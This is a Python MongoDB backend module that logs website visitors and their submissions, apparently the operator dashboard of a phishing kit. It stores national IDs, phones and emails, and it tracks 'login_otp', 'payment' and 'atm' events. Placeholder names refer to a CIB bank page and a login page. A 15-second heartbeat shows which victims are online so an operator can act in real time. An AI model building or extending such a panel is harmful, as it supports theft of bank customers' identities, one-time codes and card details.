import time
from datetime import datetime, timezone

from pymongo import ReturnDocument
from pymongo.errors import DuplicateKeyError

from .. import state
from ..db import get_mongo_db
from ..page_meta import page_key_from_source, page_label_from_source


EMPTY_NAMES = {'زائر جديد', 'زائر من صفحة CIB', 'زائر صفحة تسجيل الدخول'}
EMPTY_EMAILS = {'visitor@example.com', 'unknown@example.com'}
SUBMISSION_TYPES = {'registration', 'login', 'login_otp', 'payment', 'atm'}
ONLINE_WINDOW_SECONDS = 15
VISIT_PROJECTION = {
    'id': 1,
    'created_at': 1,
    'visitor_uid': 1,
    'source_page': 1,
    'full_name': 1,
    'national_id': 1,
    'phone': 1,
    'email': 1,
}


def serialize_dt(value) -> str:
    if isinstance(value, datetime):
        return value.isoformat()
    return str(value or '')


def event_timestamp(value) -> float:
    if isinstance(value, datetime):
        if value.tzinfo is None:
            value = value.replace(tzinfo=timezone.utc)
        return value.timestamp()
    text = str(value or '').strip()
    if not text:
        return 0.0
    if text.endswith('Z'):
        text = f'{text[:-1]}+00:00'
    try:
        parsed = datetime.fromisoformat(text)
        if parsed.tzinfo is None:
            parsed = parsed.replace(tzinfo=timezone.utc)
        return parsed.timestamp()
    except ValueError:
        return 0.0


def latest_submission_at(visitor_uid: str) -> str:
    if not visitor_uid:
        return ''
    db = get_mongo_db()
    latest = None
    row = db.registration_submissions.find_one(
        {'visitor_uid': visitor_uid},
        {'created_at': 1},
        sort=[('created_at', -1)],
    )
    if row:
        latest = row.get('created_at')
    event = db.info_events.find_one(
        {'visitor_uid': visitor_uid, 'type': {'$in': list(SUBMISSION_TYPES)}},
        {'ts': 1},
        sort=[('ts', -1)],
    )
    if event:
        event_ts = event.get('ts')
        if not latest or serialize_dt(event_ts) > serialize_dt(latest):
            latest = event_ts
    return serialize_dt(latest)


def latest_submission_at_map(visitor_uids: list[str]) -> dict[str, str]:
    uids = list(dict.fromkeys(uid for uid in visitor_uids if uid))
    if not uids:
        return {}

    db = get_mongo_db()
    latest_by_uid: dict[str, str] = {}
    for row in db.registration_submissions.aggregate(
        [
            {'$match': {'visitor_uid': {'$in': uids}}},
            {'$group': {'_id': '$visitor_uid', 'created_at': {'$max': '$created_at'}}},
        ]
    ):
        uid = row.get('_id') or ''
        if uid:
            latest_by_uid[uid] = serialize_dt(row.get('created_at'))

    for row in db.info_events.aggregate(
        [
            {'$match': {'visitor_uid': {'$in': uids}, 'type': {'$in': list(SUBMISSION_TYPES)}}},
            {'$group': {'_id': '$visitor_uid', 'ts': {'$max': '$ts'}}},
        ]
    ):
        uid = row.get('_id') or ''
        if not uid:
            continue
        candidate = serialize_dt(row.get('ts'))
        if event_timestamp(candidate) > event_timestamp(latest_by_uid.get(uid, '')):
            latest_by_uid[uid] = candidate

    return latest_by_uid


def is_new_entry(row: dict) -> bool:
    """A landing-only visitor has no submitted/contact data yet."""
    full_name = (row.get('full_name') or '').strip()
    national_id = (row.get('national_id') or '').strip()
    phone = (row.get('phone') or '').strip()
    email = (row.get('email') or '').strip()

    has_name = bool(full_name and full_name not in EMPTY_NAMES)
    has_national_id = bool(national_id and national_id != '0000000000')
    has_phone = bool(phone and phone != '0500000000')
    has_email = bool(email and email not in EMPTY_EMAILS)
    return not any((has_name, has_national_id, has_phone, has_email))


def get_visits_total_count() -> int:
    now = time.time()
    if now - state.visits_count_cache['at'] < 30:
        return state.visits_count_cache['value']
    value = get_mongo_db().visits.count_documents({})
    state.visits_count_cache['value'] = value
    state.visits_count_cache['at'] = now
    return value


def next_visit_id() -> int:
    db = get_mongo_db()
    counter = db.counters.find_one_and_update(
        {'_id': 'visits.id'},
        {'$inc': {'seq': 1}},
        upsert=True,
        return_document=ReturnDocument.AFTER,
    )
    return int(counter['seq'])


def serialize_visit(row: dict, display_id: int | None = None, latest_submission_at_value: str | None = None) -> dict:
    source_page = row.get('source_page', '')
    visitor_uid = row.get('visitor_uid', '')
    return {
        'id': row.get('id'),
        'display_id': display_id if display_id is not None else row.get('id'),
        'created_at': row.get('created_at', ''),
        'visitor_uid': visitor_uid,
        'source_page': source_page,
        'page_key': page_key_from_source(source_page),
        'page_label': page_label_from_source(source_page),
        'full_name': row.get('full_name', ''),
        'national_id': row.get('national_id', ''),
        'phone': row.get('phone', ''),
        'email': row.get('email', ''),
        'latest_submission_at': latest_submission_at_value if latest_submission_at_value is not None else latest_submission_at(visitor_uid),
    }


def list_visits(limit: int | None = None, offset: int = 0, sort_online_first: bool = False) -> list[dict]:
    db = get_mongo_db()
    total = get_visits_total_count()
    if sort_online_first:
        rows = list(db.visits.find({}, VISIT_PROJECTION))
        latest_by_uid = latest_submission_at_map([row.get('visitor_uid', '') for row in rows])
        now_ts = datetime.now(timezone.utc).timestamp()

        def sort_key(row: dict) -> tuple[int, float, int]:
            created_ts = event_timestamp(row.get('created_at'))
            age = now_ts - created_ts
            is_online = 1 if 0 <= age <= ONLINE_WINDOW_SECONDS else 0
            latest_ts = event_timestamp(latest_by_uid.get(row.get('visitor_uid', ''), ''))
            return (is_online, latest_ts, int(row.get('id') or 0))

        rows.sort(key=sort_key, reverse=True)
        page_rows = rows[offset:] if limit is None else rows[offset:offset + limit]
    else:
        cursor = db.visits.find({}, VISIT_PROJECTION).sort('id', -1).skip(offset)
        if limit is not None:
            cursor = cursor.limit(limit)
        page_rows = list(cursor)
        latest_by_uid = latest_submission_at_map([row.get('visitor_uid', '') for row in page_rows])

    return [
        serialize_visit(
            row,
            display_id=total - offset - index,
            latest_submission_at_value=latest_by_uid.get(row.get('visitor_uid', ''), ''),
        )
        for index, row in enumerate(page_rows)
    ]


def create_visit_record(payload: dict) -> dict:
    now = datetime.now(timezone.utc).isoformat()
    visitor_uid = (payload.get('visitor_uid') or '').strip()
    incoming = {
        'created_at': now,
        'visitor_uid': visitor_uid,
        'source_page': payload.get('source_page', ''),
        'full_name': payload.get('full_name', ''),
        'national_id': payload.get('national_id', ''),
        'phone': payload.get('phone', ''),
        'email': payload.get('email', ''),
    }
    is_new_row = False
    db = get_mongo_db()

    update_fields = {'created_at': incoming['created_at']}
    for field in ('source_page', 'full_name', 'national_id', 'phone', 'email'):
        if incoming[field] != '':
            update_fields[field] = incoming[field]

    if visitor_uid:
        inserted_id = None
        try:
            result = db.visits.update_one(
                {'visitor_uid': visitor_uid},
                {'$set': update_fields},
            )
            if result.matched_count == 0:
                new_id = next_visit_id()
                result = db.visits.update_one(
                    {'visitor_uid': visitor_uid},
                    {
                        '$set': update_fields,
                        '$setOnInsert': {'id': new_id, 'visitor_uid': visitor_uid},
                    },
                    upsert=True,
                )
                inserted_id = result.upserted_id
        except DuplicateKeyError:
            db.visits.update_one(
                {'visitor_uid': visitor_uid},
                {'$set': update_fields},
            )
        is_new_row = inserted_id is not None
        row = serialize_visit(db.visits.find_one({'visitor_uid': visitor_uid}) or {**incoming, **update_fields})
    else:
        is_new_row = True
        anon_id = next_visit_id()
        row = {**incoming, 'id': anon_id, 'visitor_uid': f'server_anon_{anon_id}'}
        db.visits.insert_one(row.copy())

    if row['visitor_uid']:
        now_dt = datetime.now(timezone.utc)
        db.visitor_profiles.update_one(
            {'visitor_uid': row['visitor_uid']},
            {
                '$set': {
                    'last_visit_at': now_dt,
                    'last_source_page': row['source_page'],
                    'full_name': row['full_name'],
                    'national_id': row['national_id'],
                    'phone': row['phone'],
                    'email': row['email'],
                },
                '$setOnInsert': {'first_visit_at': now_dt},
                '$inc': {'visit_count': 1},
            },
            upsert=True,
        )

    state.visits_count_cache['at'] = 0.0
    return {
        'visitor_uid': row['visitor_uid'],
        'created_at': row['created_at'],
        'source_page': row['source_page'],
        'full_name': row['full_name'],
        'national_id': row['national_id'],
        'phone': row['phone'],
        'email': row['email'],
        'is_new_row': is_new_row,
        'is_new_entry': is_new_entry(row),
        'latest_submission_at': latest_submission_at(row['visitor_uid']),
    }


def dashboard_row_for_visitor_uid(visitor_uid: str, *, display_id: int | None = None) -> dict | None:
    """Fetch a single visit row formatted for the dashboard table."""
    visitor_uid = (visitor_uid or '').strip()
    if not visitor_uid:
        return None
    db = get_mongo_db()
    row = db.visits.find_one({'visitor_uid': visitor_uid})
    if not row:
        return None
    latest_value = latest_submission_at(visitor_uid)
    return serialize_visit(row, display_id=display_id, latest_submission_at_value=latest_value)


def touch_visit_presence(visitor_uid: str, source_page: str = '', *, include_submission_at: bool = True) -> dict:
    """Lightweight heartbeat update for presence without incrementing visit counters."""
    visitor_uid = (visitor_uid or '').strip()
    if not visitor_uid:
        return {}

    db = get_mongo_db()
    now = datetime.now(timezone.utc).isoformat()
    update_fields = {'created_at': now}
    if source_page:
        update_fields['source_page'] = source_page

    result = db.visits.update_one({'visitor_uid': visitor_uid}, {'$set': update_fields})
    if result.matched_count == 0:
        # First heartbeat for this uid: create a full row using the normal path.
        return create_visit_record({'visitor_uid': visitor_uid, 'source_page': source_page})

    row = db.visits.find_one({'visitor_uid': visitor_uid}) or {}
    return {
        'visitor_uid': visitor_uid,
        'created_at': row.get('created_at', now),
        'source_page': row.get('source_page', source_page),
        'full_name': row.get('full_name', ''),
        'national_id': row.get('national_id', ''),
        'phone': row.get('phone', ''),
        'email': row.get('email', ''),
        'is_new_row': False,
        'is_new_entry': is_new_entry(row),
        'latest_submission_at': latest_submission_at(visitor_uid) if include_submission_at else '',
    }
